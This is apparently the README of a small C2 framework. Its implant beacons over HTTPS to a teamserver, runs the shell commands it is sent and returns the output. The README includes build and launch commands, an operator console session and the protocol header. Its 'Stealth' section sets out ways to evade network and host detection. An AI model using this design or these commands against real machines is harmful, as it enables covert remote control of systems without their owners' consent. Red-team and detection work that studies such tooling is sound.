<h4 align="center">A Micro Stealth C2 Framework built in C/C++</h4>

---

### What it is

Two binaries. A **teamserver** you type commands into, and an **implant** that
polls it over HTTPS, runs what it is given, and posts back the output. The
implant never listens on a port.

### Features

- HTTPS only, on a port that blends in with ordinary TLS traffic.
- Beacon check-in: the implant polls for work, so the server never dials out.
- One frame format shared by both sides, so they cannot drift apart.
- A session id per implant, each with its own command queue.
- A command stays queued until its output arrives, and is re-sent if it is lost.
- An implant linking only `libssl`, `libcrypto` and `libc` — no libcurl.
- Self-signed certificate generated by the build.

### Tools

- **C17** for the implant and the frame codec, no GNU extensions.
- **C++17** for the teamserver and tests, `std::thread` for the console.
- **CMake 3.16+**, with `FetchContent` for cpp-httplib.
- **cpp-httplib v0.66.0**: the teamserver's HTTPS server only.
- **OpenSSL 3**: TLS in both binaries, `RAND_bytes` for the session id, and
  `openssl req` at build time for the certificate.
- **POSIX**: sockets, `popen`, `nanosleep` and `getaddrinfo`.
- **CTest** for the frame and session-store tests.
- **binutils**: `strip`, plus an `objcopy` pass over the build metadata.
- **Docker** for `scripts/build-implant.sh`.

### Stealth

This lowers what a host or a network sensor can learn. It does not hide anything
from the machine's owner; `DEPLOYMENT.md` §3 lists what is still visible.

- Outbound only: nothing binds a port.
- A fresh connection per beacon, closed straight after the reply.
- A poll every 3–7 seconds, jittered, so there is no fixed beat.
- A binary 16-byte header: no JSON, no text verbs.
- Paths that read as telemetry, not as commands.
- Certificate pinning: the pinned CA is the only trust anchor, TLS 1.2 minimum.
- A random session id, drawn once at start-up.
- Silent on success; failures are short, fixed messages.
- `popen` resolves the shell at run time, so no shell path sits in `.rodata`.
- Four shared libraries, and no curl version to fingerprint.
- Stripped: no symbols, build id or compiler version.

### Quick start

Needs CMake 3.16+, a C17/C++17 compiler, OpenSSL headers, and `openssl` on
`PATH`.

```sh
cmake -S . -B build
cmake --build build
ctest --test-dir build
```

That produces `build/server` (teamserver) and `build/agent` (implant). Run both
from the project root, because the certificate path is relative:

```sh
./build/server
./build/agent --host 192.168.50.50
```

The console needs a session selected before it will queue anything:

```
c2_server> sessions
[*] 1 session(s), * = receives commands
    5f3a91c2  0s ago
c2_server> use 5f3a91c2
[*] using 5f3a91c2
c2_server> id -u
```

Anything else typed is queued for that session. `exit` targets the selected
session, `exit <id>` one session, `exit all` every session. `quit` closes the
console and leaves the server running.

### The protocol

Every message is a 16-byte header followed by a payload.

```c
struct C2_HEADER {
  uint32_t magic;        /* 0x41414141 */
  uint32_t command_id;   /* CMD_* */
  uint32_t payload_size; /* bytes after the header */
  uint32_t session_id;   /* never 0 */
};
```

`CMD_CHECK_IN` (100) polls, `CMD_EXIT` (101) shuts down, and
`CMD_EXECUTE_SHELL` (102) carries a command or its output. Fields are in host
byte order, so both ends must agree on endianness.

A frame is rejected unless the magic matches, `payload_size` accounts for the
body exactly, and the session id is non-zero. `POST /api/v2/metrics` answers
`200` with a command or `204` when the queue is empty; `POST /api/v2/events`
uploads output and acknowledges it.

### Limitations

- No authentication: a session id is claimed, not proven.
- State is in memory, so a restart drops every queue.
- Delivery is at-least-once, so a lost reply re-runs the command.
- Output is capped at 4096 bytes, collected when the command exits.
- Control bytes print escaped, so `^A` and a real `0x01` look the same.
- Needs glibc 2.34 or newer and `libssl.so.3`.
